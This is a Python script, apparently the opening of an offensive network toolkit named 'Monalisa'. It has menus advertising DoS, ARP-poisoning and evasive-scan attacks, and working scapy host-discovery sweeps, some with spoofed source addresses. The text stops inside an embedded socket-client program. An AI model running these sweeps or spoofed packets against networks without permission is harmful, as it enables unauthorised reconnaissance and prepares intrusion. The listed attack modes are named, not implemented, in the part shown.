#!/usr/bin/python
from scapy.all import *
from time import sleep as s
from prettytable import PrettyTable as tabular
from rich.progress import Progress
import json
import pprint
from itertools import cycle
from shutil import get_terminal_size
from threading import Thread
import progressbar
import distro
import nmap
from treelib import Tree
from awesome_progress_bar import ProgressBar
from termcolor import colored
import subprocess as commander
from os import system,name,getuid,path
get_uid=getuid()
directory="/usr/share/mona/"
system('clear')
s(1)
virus_text="""
    ▄       ▄█     █▄▄▄▄       ▄          ▄▄▄▄▄           ▄████  ████▄   ▄      ▄   ██▄     ▄
     █      ██     █  ▄▀        █        █     ▀▄         █▀   ▀ █   █    █      █  █  █   █ 
█     █     ██     █▀▀▌      █   █     ▄  ▀▀▀▀▄           █▀▀    █   █ █   █ ██   █ █   █ █  
 █    █     ▐█     █  █      █   █      ▀▄▄▄▄▀            █      ▀████ █   █ █ █  █ █  █  █  
  █  █       ▐       █       █▄ ▄█                         █           █▄ ▄█ █  █ █ ███▀     
   █▐               ▀         ▀▀▀                           ▀           ▀▀▀  █   ██       ▀  
   ▐                                                                                         
   """
class Pre_theme:
      def __init__(self, desc="Loading...", end=colored(virus_text,'yellow',attrs=['bold']), timeout=0.1):
         self.desc = desc
         self.end = end
         self.timeout = timeout
         self._thread = Thread(target=self._animate, daemon=True)
         self.steps = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]
         self.done = False
      def start(self):
          self._thread.start()
          return self
      def _animate(self):
          for c in cycle(self.steps):
              if self.done:
                 break
              print(f"\r{self.desc} {c}", flush=True, end="")
              s(self.timeout)
      def __enter__(self):
          self.start()
      def stop(self):
          self.done = True
          cols = get_terminal_size((180, 120)).columns
          print("\r" + " " * cols, end="", flush=True)
          print(f"\r{self.end}", flush=True)
      def __exit__(self, exc_type, exc_value, tb):
          self.stop()
class Design:
      def __init__(self):
          project_title="""
 ███▄ ▄███▓    ▒█████      ███▄    █     ▄▄▄          ██▓        ██▓     ██████     ▄▄▄      
▓██▒▀█▀ ██▒   ▒██▒  ██▒    ██ ▀█   █    ▒████▄       ▓██▒       ▓██▒   ▒██    ▒    ▒████▄    
▓██    ▓██░   ▒██░  ██▒   ▓██  ▀█ ██▒   ▒██  ▀█▄     ▒██░       ▒██▒   ░ ▓██▄      ▒██  ▀█▄  
▒██    ▒██    ▒██   ██░   ▓██▒  ▐▌██▒   ░██▄▄▄▄██    ▒██░       ░██░     ▒   ██▒   ░██▄▄▄▄██ 
▒██▒   ░██▒   ░ ████▓▒░   ▒██░   ▓██░    ▓█   ▓██▒   ░██████▒   ░██░   ▒██████▒▒    ▓█   ▓██▒
░ ▒░   ░  ░   ░ ▒░▒░▒░    ░ ▒░   ▒ ▒     ▒▒   ▓▒█░   ░ ▒░▓  ░   ░▓     ▒ ▒▓▒ ▒ ░    ▒▒   ▓▒█░
░  ░      ░     ░ ▒ ▒░    ░ ░░   ░ ▒░     ▒   ▒▒ ░   ░ ░ ▒  ░    ▒ ░   ░ ░▒  ░ ░     ▒   ▒▒ ░
░      ░      ░ ░ ░ ▒        ░   ░ ░      ░   ▒        ░ ░       ▒ ░   ░  ░  ░       ░   ▒   
       ░          ░ ░              ░          ░  ░       ░  ░    ░           ░           ░  ░
"""
          title_color=colored(project_title,'red')
          print(title_color)
          #banner="꧁ ༺ -------------------*•.¸♡爪ʘϞꪖ𝓵ᶦ𝙨ⲁ♡¸.•*-------------------༻ ꧂  "
          #for text in banner:
           #   print(text,end="",flush=True)
            #  s(0.05)
          print(colored("\t\t\t\t Author:- ",'red',attrs=['bold']),end="")
          print(colored("乂akash_sil乂 ",'blue',attrs=['bold']))
          print("\nHiii Maaam...😉")
      def usage(self):
          table=tabular(["Attacks","Type"])
          table.title="☠️  Select An Attack Type ☠️ "
          attack_mode=[("Ping Attack","1"),("Socket Checker","2"),("Port Scanner","3"),("DoS Attack","4"),("MITM Attack","5"),("Exit","6")]
          table.add_rows(attack_mode)
          print(table)
      def arpdesign(self):
          arp_text="༒--------------------Äའℙ ᴾเ几🅶--------------------༒ "
          for arp in arp_text:
              print(arp,end="",flush=True)
              s(0.02)
      def ipdesign(self):
          ip_text="༺ -------------------Ìþ þÌñG----------------------༻ "
          for ip in ip_text:
              print(ip,end="",flush=True)
              s(0.02)
      def icmpdesign(self):
          icmp_text="☣------------------I̴C̶M̵P̴ ̵P̴I̸N̵G̸---------------------☣"
          for icmp in icmp_text:
              print(icmp,end="",flush=True)
              s(0.02)
      def tcp_ping_design(self):
          tcp_ping_text="༺------------------•°•°☁𝑻ℂℙ ℙϊꫜᶢ☁°•°•---------------------༻"
          for tcp in tcp_ping_text:
              print(tcp,end="",flush=True)
              s(0.02)
      def udp_ping_design(self):
          udp_ping_text="☽------------------ᵁᎠ𝙋 𝙋𝖎ᶯℊฅ^•ﻌ•^ฅ---------------------☾"
          for udp in udp_ping_text:
              print(udp,end="",flush=True)
              s(0.02)
      def pingdesign(self):
          ping_t="✩------------------Pi҉n҉g҉ Mod҉e҉ ---------------------✩"
          for pi in ping_t:
              print(pi,end="",flush=True)
              s(0.02)
      def socket_check(self):
          socket_text="×͜×----------------§ð¢kê† Äñåł¥§ï§------------------×͜×"
          for sock in socket_text:
              print(sock,end="",flush=True)
              s(0.02)
      def port_monitor(self):
          port_moni="╰‿╯------------------⚠️ 𝐏๏𝔯† کcāƞƞⲉ𝔯 ⚠️ ----------------╰‿╯"
          for sc in port_moni:
              print(sc,end="",flush=True)
              s(0.02)
      def ping_design(self):
          ping_text="X--------------Ｐｉｎｇ Ｇｅｎｅｒａｔｏｒ-------------X"
          for pingtext in ping_text:
              print(pingtext,end="",flush=True)
              s(0.02)
      def nmap_design(self):
          nmap_text="﴾--------------------👁  ℕ𝕞 𝕒𝕡 👁---------------------﴿"
          for n in nmap_text:
              print(n,end="",flush=True)
              s(0.02)
      def tcp_scanner(self):
          tcp_text="༒--------------ﮩ٨ـﮩﮩ٨ـ𝘛cⲣ ꕷcăꪀꪀёгﮩ٨ـﮩﮩ٨ـ------------------༒"
          for t in tcp_text:
              print(t,end="",flush=True)
              s(0.02)
      def udp_scanner(self):
          udp_text="☠--------------┈━═☆ Ｕɗ𝐩 ڳcǻ𝐧пέ𝙧 ☆═━┈-----------------☠"
          for u in udp_text:
              print(u,end="",flush=True)
              s(0.02)
      def firewall(self):
          firewall_text="︻╦デ╤━╾--------------༺  ☆ ғ𝘪𝚛𝒆ຟสʆʆ工𝐃ꕷ ☆ ༻--------------╾━╤デ╦︻"
          for fire in firewall_text:
              print(fire,end="",flush=True)
              s(0.02)
      def badsum_design(self):
          badsum_text="฿₳Đ-----------------*+:｡.｡-ᛔᴧȡꕷꪊ𐌼 ʌ𝐭𝐭ᴧcќ-｡.｡:+*----------------฿₳Đ"
          for scan in badsum_text:
              print(scan,end="",flush=True)
              s(0.02)
      def decoy_design(self):
          decoy_text="❖─╬-----------------ᗫᶓc𝖔γ ડcąꫛฅ^•ﻌ•^ฅ----------------╬─❖"
          for scan in decoy_text:
              print(scan,end="",flush=True)
              s(0.02)
      def proxy_design(self):
          proxy_text="ŦŘǤŦ-----------------▄ⓟᖇ𝐨ｘⓎ άŦŤ𝕒¢𝓚︻┻═┳一----------------ŦŘǤŦ"
          for scan in proxy_text:
              print(scan,end="",flush=True)
              s(0.02)
      def osscan(self):
          osscan_text="𒅒  -------------------╰‿╯ Ꮻຣ𝕊cⱥ𝔫𝔫еʳ ╰‿╯--------------𒅒"
          for os in osscan_text:
              print(os,end="",flush=True)
              s(0.02)
      def limit_design(self):
          limit_text="ꪶ࿋྄ིᤢ ꫂ-----------------☆*:.｡.𝐍𝘰𝕣ოꪋᶩ ℳ𝘰𝑑ė.｡.:*☆----------------ꪶ࿋྄ིᤢ ꫂ"
          for scan in limit_text:
              print(scan,end="",flush=True)
              s(0.02)
      def limit2_design(self):
          limit2_text="∉ ෴  ∌-----------------❝ ᝨօ𝚙ĺc𝕒𝔩 爪օⓓ 𝒆_! ❞----------------∉ ෴  ∌"
          for scan in limit2_text:
              print(scan,end="",flush=True)
              s(0.02)
      def brutal_design(self):
          brutal_text="⎝ཌད⎠-----------------▄︻┻̿ᏗᎶᎶᏒᏋᏕᏕᎥᏉ Ꮛ Ꮇ ᎧᎴᏋ═━一----------------⎝ཌད⎠"
          for scan in brutal_text:
              print(scan,end="",flush=True)
              s(0.02)
      def scan_design(self):
          scan_text="༺  ☠ -----------------¢==[]:::乂✰ ᵴcãทท𝓲ᥒℊ✰乂::::>----------------☠ ༻"
          for scan in scan_text:
              print(scan,end="",flush=True)
              s(0.02)
      def maimon_design(self):
          maimon_text="彡★彡-----------------𓊈ℳ 𝖆ī𝙢 օꪦ ᴬₜₜ𝔞cꝁ𓊉----------------彡★彡"
          for scan in maimon_text:
              print(scan,end="",flush=True)
              s(0.02)
      def service_design(self):
          service_text="㉿웃㉿࿐ -----------------▄︻┻═┳一.Ⓢ ⓔ ⓡ ⓥ ⓘ ⓒ ⓔ 乂Ⓓ ⓔ ⓣ ⓔ ⓒ ⓣ ⓘ ⓞ ⓝ ----------------㉿웃㉿࿐"
          for scan in service_text:
              print(scan,end="",flush=True)
              s(0.02)
      def xmas_design(self):
          xmas_text="×º°”˜`”°º×-----------------♡•☆•♡父𝖒ѦᎦ ṠcẳϞ♡•☆•♡----------------×º°”˜`”°º×"
          for scan in xmas_text:
              print(scan,end="",flush=True)
              s(0.02)
      def zombie_design(self):
          zombie_text="⌐(×▵×⌐҂)-----------------¤¸¸.•´¯`•¸¸.•..>> 乙๏ო多ﺂê Šcᴧท <<..•.¸¸•´¯`•.¸¸¤----------------⌐(×▵×⌐҂)"
          for scan in zombie_text:
              print(scan,end="",flush=True)
              s(0.02)
      def dos_design(self):
          dos_text="(⌐■_■)–︻╦╤─---------------╾━╤デ╦︻=(☠Ꭰǿڳ ÃŦ𝐓𝒶ᑕ𝓚☠︎)=︻╦デ╤━╾--------------━╤デ╦︻-(■_■-)"
          for scan in dos_text:
              print(scan,end="",flush=True)
              s(0.02)
      def pod_design(self):
          pod_text="⎧ᴿᴵᴾ⎫------------˼͝ʹ͜ ˓̇͜∙͡∘⋟͜˒↷ 𝙿༏пĝ ő𝔣 ĎᏋⱥ𝗍Ꮒ↶˓͜⋞∙͜͡∘ʹ͜˻͝-------------⎧ᴿᴵᴾ⎫"
          for podtext in pod_text:
              print(podtext,end="",flush=True)
              s(0.02)
      def deauhentinticaton_design(self):
          deautheication_text="━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━------------▶●───ĐɆ₳Ʉ₮ⱧɆ₦₮ł₵₳₮łØ₦ ₳₮₮₳₵₭────▶●-------------━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━"
          for deauth in deautheication_text:
              print(deauth,end="",flush=True)
              s(0.02)
      def synflood_design(self):
          synflood_text="乂--------------☾•ន𝒚ꫛ 𝘍𝒍𝗈ѻժ 𐌀ʇʇ𝕒c𝚔•☽---------------乂"
          for syn in synflood_text:
              print(syn,end="",flush=True)
              s(0.02)
      def smurf_design(self):
          smurf_text="*•.¸--------------⪨ Ṧ₥𐌵𝚛𝕗 𝑨††ⱥc𝒌 ⪩---------------¸.•*"
          for syn in smurf_text:
              print(syn,end="",flush=True)
              s(0.02)
      def teardrop_design(self):
          teardrop_text="☾☿☽--------------(☉｡☉)!→イɇ𝚊®𝕕®о𝖕 ᗅ𝗍𝗍𝔞c𝓀!---------------☾☿☽"
          for syn in teardrop_text:
              print(syn,end="",flush=True)
              s(0.02)
      def active_mode(self):
          active_text="꧁★-------------------╰‿╯Ã𝐜𝐓ίѶＥ 𝔸Ｔ𝕥卂Č𝓚╰‿╯---------------------★꧂"
          for ac in active_text:
              print(ac,end="",flush=True)
              s(0.02)
      def arp_poison_design(self):
          arp_poison_text="✦☣✧-------------------⚠∀℟𝑃 や☢ḭﺂڳ𝖔ᴻﺂᴻ𝙜⚠---------------------✧☣✦"
          for ac in arp_poison_text:
              print(ac,end="",flush=True)
              s(0.02)
      def dhcp_star_design(self):
          dhcp_poison_text=">✯<-------------------＊*•̩̩͙✩•̩̩͙*˚ⅅĦᥴ𝗣 ꌚ𝔱ⱥℝꪜⱥ𝘁𝓲𝗼ⁿ*•̩̩͙✩•̩̩͙*˚＊--------------------->✯<"
          for ac in dhcp_poison_text:
              print(ac,end="",flush=True)
              s(0.02)
      def passive_mode(self):
          passive_text="꧁༒-------------------乂✰𝓹𝕒Ŝ丂Ɨᐯέ 𝐀Ｔт𝓐Ć𝓀✰乂---------------------༒꧂"
          for ac in passive_text:
              print(ac,end="",flush=True)
              s(0.02)
      def snif_design(self):
          snif_text="﴾ ⌦  乂⌫ ﴿ ----------------༒ Ｍ𝐼ⲧＭ À𝙩𝙩ⱥcḰ ༒-----------------﴾ ⌦  乂⌫ ﴿"
          for syn in snif_text:
              print(syn,end="",flush=True)
              s(0.02)
      def sniffer_design(self,sniffer_name):
          sniffer_text=f"乂----------------کꫛ𝙞𝖋𝕗℮ᵣ [{sniffer_name}] Ă††ⱥc𝙠-----------------乂"
          for syn in sniffer_text:
              print(syn,end="",flush=True)
              s(0.02)
      def tcpdump_design(self):
          tcpdump_text="(ᵔᴥᵔ)----------------*•.¸♡ィç尸 ꓓꪊꪔ尸♡¸.•*-----------------(ᵔᴥᵔ)"
          for syn in tcpdump_text:
              print(syn,end="",flush=True)
              s(0.02)
      def tshark_design(self):
          tshark_text="(⚔)----------------⚓•🦈-<𓂁ᛠ𓂄-ک𝙝𝓪𝗿ӄ>-🦈•⚓-----------------(⚔)"
          for syn in tshark_text:
              print(syn,end="",flush=True)
              s(0.02)
      def wireshark_design(self):
          wireshark_text="⎝ཌད⎠----------------𓂁山¡𝔯ɇ-🦈-𝑺Ꮒⱥ𝗿𝐤𓂄-----------------⎝ཌད⎠"
          for syn in wireshark_text:
              print(syn,end="",flush=True)
              s(0.02)
      def nmap_table(self):
          nmaptable=tabular(["Attack Mode","Number"])
          nmaptable.title="🪬Nmap Attack Modes🪬"
          nmaptable_rows=[("Firewall/IDS","1"),("OsScanner","2"),("Scanning","3")]
          nmaptable.add_rows(nmaptable_rows)
          print(nmaptable)
      def tcp_flags(self):
          flag_table=tabular(["Flags","Numbers"])
          flag_table.title="𓆩💜𓆪 TCP Flags 𓆩💜𓆪"
          flag_table_rows=[("[SYN]","1"),("[SYN,ACK]","2"),("[SYN,RST]","3"),("[SYN,URG]","4"),("[SYN,FIN]","5"),("[RST]","6"),("[RST,ACK]","7"),("[RST,URG]","8"),("[RST,FIN]","9"),("[URG]","10"),("[URG,ACK]","11"),("[URG,FIN]","12"),("[FIN]","13"),("[FIN,ACK]","14"),("[ACK]","15"),("[PSH,ACK]","16"),("[PSH,RST]","17"),("[PSH,URG]","18"),("[PSH,URG]","19"),("[PSH,FIN]","20"),("[PSH,SYN]","21"),("[FIN,PSH,URG]","22"),("[Null]","23")]
          flag_table.add_rows(flag_table_rows)
          print(flag_table)
      def flagable(self):
          flagtable=tabular(["Flags","Number"])
          flagtable.title="❗ IP Flags Type ❗" 
          flag_rows=[("RF","0"),("DF","1"),("MF","2")]
          flagtable.add_rows(flag_rows)
          print(flagtable)
      def banner_ip(self,my_ip,border_style='*'):
          borders=border_style*(len(my_ip)+4)
          format=f"{borders}\n{border_style} {my_ip} {border_style}\n{borders}"
          print(format)
      def server_type(self):
          port_scanner=tabular(["Server","No"])
          port_scanner.title="Server Type"
          port_scanner_value=[("TCP","3"),("UDP","4")]
          port_scanner.add_rows(port_scanner_value)
          print(port_scanner)
      def client_type(self):
          cl=tabular(["Client","No"])
          cl.title="Client Type"
          cl_val=[("TCP","1"),("UDP","2")]
          cl.add_rows(cl_val)
          print(cl)
      def firewall_attack_mode(self):
          f=tabular(["Attack","No"])
          f.title="⚠ Firewall Attack Type ⚠"
          f_val=[("Badsum","1"),("Decoy Scan","2"),("Proxy Attack","3")]
          f.add_rows(f_val)
          print(f) 
      def osscan_attack_mode(self):
          o=tabular(["Attack","No"])
          o.title="☣ OsScan Attack Mode ☣"
          o_val=[("Aggressive Mode","1"),("Normal Mode","2"),("Topical Mode","3")]
          o.add_rows(o_val)
          print(o) 
      def scan_attack_mode(self):
          s=tabular(["Attack","No"])
          s.title="☠ Scan Attack Type ☠"
          s_val=[("Maimon Scan","1"),("Service Detection","2"),("Xmas Scan","3"),("Zombie Scan","4")]
          s.add_rows(s_val)
          print(s) 
      def attack_method_table(self):
          dostable=tabular(["Attack Mode","Number"])
          dostable.title="☠ DoS Attack Modes ☠"
          dostable_rows=[("Ping Of Death","1"),("Deauthentication","2"),("SYN Flood","3"),("Smurf Attack","4"),("Teardrop Attack","5")]
          dostable.add_rows(dostable_rows)
          print(dostable)
      def sniffing_active_table(self):
          sn=tabular(["Sniffing Mode","Number"])
          sn.title="SniFFer Active Mode ON"
          sn_rows=[("ARP Poisoning","1"),("DHCP Starvation","2")]
          sn.add_rows(sn_rows)
          print(sn)
      def sniffing_passive_table(self):
          sn_pa=tabular(["Sniffing Mode","Number"])
          sn_pa.title="SniFFer Passive Mode ON"
          sn_pa_rows=[("Shark","1"),("Sniff","2"),("TCPdump","3")]
          sn_pa.add_rows(sn_pa_rows)
          print(sn_pa)
      def sniffing_sniffer_table(self):
          sn_pa_sn=tabular(["Sniffer Mode","Number"])
          sn_pa_sn.title="ᚸ Monitor Mode ON ᚸ"
          sn_pa_sn_rows=[("ARP","1"),("TCP","2"),("UDP","3")]
          sn_pa_sn.add_rows(sn_pa_sn_rows)
          print(sn_pa_sn)
      def shark_table(self):
          shark=tabular(["Shark Mode","Number"])
          shark.title="𓂁 Shark Attack Mode 𓂄"
          shark_rows=[("T-Shark","1"),("Wire-Shark","2")]
          shark.add_rows(shark_rows)
          print(shark)
      def sniffing_mode(self):
          snif=Tree()
          snif.create_node("MITM Attack","attack")
          snif.create_node("Active Attack","active",parent="attack")
          snif.create_node("Passive Attack","passive",parent="attack")
          snif.create_node("DHCP Starvation","star",parent="active")
          snif.create_node("ARP Poisoning","poison",parent="active")
          snif.create_node("Sniff","sniff",parent="passive")
          snif.create_node("UDP","udp",parent="sniff")
          snif.create_node("TCP","tcp",parent="sniff")
          snif.create_node("ARP","arp",parent="sniff")
          snif.create_node("Shark","shark",parent="passive")
          snif.create_node("TCPdump","dump",parent="passive")
          snif.create_node("WireShark","wire",parent="shark")
          snif.create_node("T-Shark","tshark",parent="shark")
          print(snif)
def main():
    global ip_first
    global ip_firstrange
    global ip_lastrange
    global gateway
    global my_ip
    global interface_val
    global tcp_attack
    global udp_attack
    global layer_num
    exit_val=0
    def given_value(value,num_of_layer):
        if value==1: 
            D.ping_design()
            print("")
            p_check = """
  (                                 _
   )                               /=>
  (  +____________________/\/\___ / /|
   .''._____________'._____      / /|/\\
  : () :              :\ ----\|    \ )
   '..'______________.'0|----|      \\
                    0_0/____/        \\
                        |----    /----\\
                       || -\\\\ --|      \\
                       ||   || ||\      \\
                        \\\\____// '|      \\
Bang! Bang!                     .'/       |
                               .:/        |
                               :/_________|
                                           
"""
            print(colored(p_check,"yellow",attrs=['bold']))
            table=tabular(["Ping","Type"])
            table.title="⚔️  Ping Attack ⚔️ "
            attack_rows=[("ARP","1"),("IP","2"),("ICMP","3"),("TCP","4"),("UDP","5"),("DeFault","6")]
            table.add_rows(attack_rows)
            print(table)
            print("Even Maam, I'm also providing a default Ping Command from your device By pressing Enter...😊")
            Ping=input("Plz Select the Ping type:- ")
            if Ping=='1':
               D.arpdesign()
               arp=int(input("\nBut it has two methods 1 and 2:- "))
               if arp==1:
                  broadcast="ff:ff:ff:ff:ff:ff"
                  dot="𝔾𝔞ᴍ𝑒 O𝒩 𝕓ａвʸʸ𝔶ʏץʏ..😎"
                  for d in dot:
                      print(d,end="",flush=True)
                      s(0.3)
                  print("")
                  def arpping(ip_first,ip_firstrange,ip_lastrange):
                       host_arp=[]
                       for ip_lastbyte in range(ip_firstrange,ip_lastrange + 1):
                           target_ip=f"{ip_first}.{ip_lastbyte}"
                           alive_hosts=srp(Ether(dst=broadcast)/ARP(op="who-has",psrc=my_ip,pdst=target_ip),timeout=5,verbose=False,iface=interface_val)
                           if alive_hosts[0]:
                               alive_hosts[0].summary(lambda s,r:r.sprintf("乂 %ARP.hwsrc% 乂<==>乂 %ARP.psrc% 乂"))
                           else:
                             alive_hosts[1].summary(lambda s:s.sprintf("I love you most...🥺 but why don't you reply Meee...%ARP.pdst%💔"))
                  arp_ping=arpping(ip_first,ip_firstrange,ip_lastrange)
                  if arp_ping:
                      for arr in arp_ping:
                           print(arr)                             
                  else:
                      pass
               elif arp==2:
                    arp="Pinging Mode ▄︻̷̿┻̿═━一 - - -> oOOOOoN"
                    for ar in arp:
                        print(ar,end="",flush=True)
                        s(0.2)
                    print("")
                    for hosts in range(ip_firstrange,ip_lastrange + 1):
                        ips=f"{ip_first}.{hosts}"
                        host=arping(ips,verbose=False)
                        host[0].nsummary(lambda s,r:r.sprintf("%ARP.psrc% <=+=> %ARP.hwsrc%"))if host[0] else host[1].summary(lambda send: send.sprintf("This host is not active or reply me 👉 %ARP.pdst%"))
            elif Ping=='2':
                D.ipdesign()
                way=input("\nMaam,if you want to give your gateway ip you can give or you can leave it by pressing enter 🙇:- ") 
                D.flagable()
                flags=int(input("Also provide the flags to set customely for an IP (灬º‿º灬)♡ :- "))
                flags_dict={"RF":0,"DF":1,"MF":2}
                def flag(flags_dict,flags):
                    for key,value in flags_dict.items():
                        if value == flags:
                            return value
                flag_set=flag(flags_dict,flags)
                port_scanners={}
                with open(directory+"protocol.json","r") as port_scanner_file:
                    port_scanners=json.load(port_scanner_file)
                    show=json.dumps(port_scanners,indent=4)
                print(show)
                proto_num=int(input("Even you can also choose type of port scanner in IP By pressing the Number Maam (◜ ‿ ◝)♡ :- "))
                def target_proto(proto_num):
                    for key,value in port_scanners.items():
                        if value == proto_num:
                           return key
                port_scanner_num=target_proto(proto_num)
                proto_str=str(port_scanner_num)
                IP_style="⌐╦╦═─ ⇝ ⇝ ⇝ ⇝ ⇝ ⇝ ⇝ ⇝"
                for style in IP_style:
                    print(style,end="",flush=True)
                    s(0.2)
                print("")
                def iphost(ip_first,ip_firstrange,ip_lastrange):
                    host=[]
                    for ip_host in range(ip_firstrange,ip_lastrange + 1):
                        target=f"{ip_first}.{ip_host}"
                        if way=='':
                            if num_of_layer==2:
                               alive_host=srp(Ether()/IP(src=my_ip,dst=target,proto=port_scanner_num,flags=flag_set),timeout=5,verbose=False,iface=interface_val)
                               if alive_host[0]:
                                    host.append(target)
                               else:
                                    pass
                            else:
                                alive_host=sr(IP(src=my_ip,dst=target,proto=port_scanner_num,flags=flag_set),timeout=5,verbose=False,iface=interface_val)
                                if alive_host[0]:
                                    host.append(target)
                                else:
                                    pass
                        else:
                            if num_of_layer==2:
                               gw_host=srp(Ether()/IP(src=way,dst=target,flags=flag_set,proto=port_scanner_num),timeout=5,verbose=False)
                               host.append(target)if gw_host[0] else None
                            else:
                                gw_host=sr(IP(src=way,dst=target,flags=flag_set,proto=port_scanner_num),timeout=5,verbose=False)
                                host.append(target)if gw_host[0] else None
                    return host
                host_ip=iphost(ip_first,ip_firstrange,ip_lastrange)
                if host_ip:
                   print("Hurrah 🥳 !!! great job Maam you've found the hosts of your Network...(≧◡≦)")
                   for alive in host_ip:
                       print(alive)if alive is not None else None
                else:
                    print("Sorry Maam...ಥ╭╮ಥ They are not alive or if alive then they didn't respond me...😞")
            elif Ping=='3':
                D.icmpdesign()
                print("")
                icmp_t="Ｓｅａｒｃｈｉｎｇ Ｎｏｗ...."
                for icmp_text in icmp_t:
                    print(icmp_text,end="",flush=True)
                    s(0.2)
                def icmp_generate(ip_first,ip_firstrange,ip_lastrange):
                    icmp_host=[]
                    for icmp in range(ip_firstrange,ip_lastrange + 1):
                        target_icmp=f"{ip_first}.{icmp}"
                        if num_of_layer==2:
                           icmp_val=srp(Ether()/IP(src=my_ip,dst=target_icmp,proto='icmp')/ICMP(type='echo-request'),timeout=5,verbose=False,iface=interface_val)
                           icmp_host.append(target_icmp)if icmp_val[0] else None
                        else:
                            icmp_val=sr(IP(src=my_ip,dst=target_icmp,proto='icmp')/ICMP(type='echo-request'),timeout=5,verbose=False,iface=interface_val)
                            icmp_host.append(target_icmp)if icmp_val[0] else None
                    return icmp_host
                print("")
                icmpp=icmp_generate(ip_first,ip_firstrange,ip_lastrange)
                if icmpp:
                    print("Alive Hosts...😈")
                    for icm in icmpp:
                         if icm:
                             print(icm)
                else:
                    print("Sorry Maam...Some ips are not reply Me....😞")
            elif Ping=='4':
                 D.tcp_ping_design()
                 print("")
                 port_val=int(input("Maam Give the destination Port ╰༼.◕ヮ◕.༽つ¤=[]———— :- "))
                 themes3="[ﾉಠೃಠ]︻̷┻̿═━一 - - - - ༄ꭺţ𝗍ⱥc𝚔༄ "
                 for x in themes3:
                     print(x,end="",flush=True)
                     s(0.2)
                 def tcp_generate(ip_first,ip_firstrange,ip_lastrange,port_val):
                     tcp_hosts=[]
                     for tcp in range(ip_firstrange,ip_lastrange + 1):
                         target_tcp=f"{ip_first}.{tcp}"
                         if num_of_layer==3:
                            tcp_val=sr(IP(src=my_ip,dst=target_tcp,proto="tcp")/TCP(dport=port_val,flags="S"),timeout=5,verbose=False,iface=interface_val)
                            tcp_hosts.append(target_tcp)if tcp_val[0] else None
                         else:
                            tcp_val=srp(Ether()/IP(src=my_ip,dst=target_tcp,proto="tcp")/TCP(dport=port_val,flags="S"),timeout=5,verbose=False,iface=interface_val)
                            tcp_hosts.append(target_tcp)if tcp_val[0] else None
                     return tcp_hosts
                 print("")
                 tcpp=tcp_generate(ip_first,ip_firstrange,ip_lastrange,port_val)
                 if tcpp:
                    print("Active Hosts...(๑ ￫ܫ ￩)")
                    for tc in tcpp:
                         if tc:
                             print(tc)
                 else:
                    print("Sorry Maam...Some ips are not reply Me....(︶︹︺)")
            elif Ping=='5':
                 D.udp_ping_design()
                 print("")
                 port_val=int(input("Maam Give the destination Port ╰༼.◕ヮ◕.༽つ¤=[]———— :- "))
                 themes4="( φ_<)r︻╦╤─ - - - 💥 "
                 for x in themes4:
                     print(x,end="",flush=True)
                     s(0.2)
                 def udp_generate(ip_first,ip_firstrange,ip_lastrange,port_val):
                     udp_hosts=[]
                     for udp in range(ip_firstrange,ip_lastrange + 1):
                         target_udp=f"{ip_first}.{udp}"
                         if num_of_layer==3:
                            udp_val=sr(IP(src=my_ip,dst=target_udp,proto="udp")/UDP(dport=port_val),timeout=5,verbose=False,iface=interface_val)
                            if udp_val[0]:
                               udp_hosts.append(target_udp)
                         else:
                            udp_val=srp(Ether()/IP(src=my_ip,dst=target_udp,proto="udp")/UDP(dport=port_val),timeout=5,verbose=False,iface=interface_val)
                            if udp_val[0]:
                               udp_hosts.append(target_udp)
                     return udp_hosts
                 print("")
                 udpp=udp_generate(ip_first,ip_firstrange,ip_lastrange,port_val)
                 if udpp:
                    print("I have Found Some Hosts...ღゝ◡╹ )ノ♡")
                    for ud in udpp:
                         if ud:
                             print(ud)
                 else:
                    print("Sorry Maam...Some ips are not reply Me....(っ◞‸◟c)")
            else:
                D.pingdesign()
                print("\nThis Ping Generator is your default Ping maam...🫰")
                more=input("Maam do you want to know more about the ip then type [y/n]:- ") 
                generator_text="🌊 .·:*¨ŞcᴧϞϞïϞց¨*:·. 🌊\n"
                for x in generator_text:
                    print(x,end="",flush=True)
                    s(0.2)
                def ping_mode(ip_first,ip_firstrange,ip_lastrange):
                    hosts_found=[]
                    active_hosts=''
                    for ip_generate in range(ip_firstrange,ip_lastrange + 1):
                        target_addr=f"{ip_first}.{ip_generate}"
                        cmd=["ping","-I",interface_val,"-c","1","-R",target_addr]
                        try:
                            if more=='y':
                                active_hosts=commander.run(cmd,capture_output=True,text=True)
                                hosts_found.append(target_addr)
                                print(active_hosts.stdout,end="\n")
                            else:
                               returnval=commander.run(cmd,capture_output=True,text=False)
                               if returnval.returncode==0:
                                  hosts_found.append(target_addr)
                        except commander.CalledProcessError:
                            print("Some Hosts are unreachable....😟")
                    if more=='n':
                        hosts_table=tabular()
                        hosts_table.field_names=["😈...Active Hosts...😈"]
                        for found_h in hosts_found:
                            hosts_table.add_row([found_h])
                        print(hosts_table)
                    else:
                        pass                             
                info=ping_mode(ip_first,ip_firstrange,ip_lastrange)
                print(info)
        elif value==2:
             D.socket_check()
             print("")
             socket_check = """                                                      
   _______________                        |*\_/*|________
  |  ___________  |     .-.     .-.      ||_/-\_|______  |
  | |           | |    .****. .****.     | |           | |
  | |   0   0   | |    .*****.*****.     | |   0   0   | |
  | |     -     | |     .*********.      | |     -     | |
  | |   \___/   | |      .*******.       | |   \___/   | |
  | |___     ___| |       .*****.        | |___________| |
  |_____|\_/|_____|        .***.         |_______________|
    _|__|/ \|_|_.............*.............._|________|_
   / ********** \                          / ********** \\
 /  ************  \                      /  ************  \\
--------------------                    --------------------                                                
"""
             print(colored(socket_check,"magenta",attrs=['bold']))
             D.client_type()
             client_input=int(input("In this field which type of client You wanna take...＼(^-^)／ :- "))
             inp_client=input("Please give a suitable name for client file Maam...♥~(◡ ‿◕ ✿) :- ")
             tcp_udp_client=directory+inp_client+".py"
             if client_input==1:
                 tcp_client_prog="""
from socket import socket,SHUT_RD
from time import sleep
banner="彡---------------༒Çþ ÇLÌÈñ༒----------------彡"
for x in banner:
    print(x,end="",flush=True)
    sleep(0.02)
print("")
tcp_client=socket()
ip_address=input("Maam Please Give your ip ෆ╹.̮╹ෆ :- ")
port=int(input("Also Give the port number which ypu've already given the server 🤗:- "))
try:
   bind_connection=(ip_address,port)
   tcp_client.connect(bind_connection)
   print("Your Connection has been established...")
   sleep(2)
   val=tcp_client.recv(4096).decode()
   if val:
      print(val)
      text=input("Do you want to send a short massage:- ").encode('utf-8')
      tcp_client.send(text)
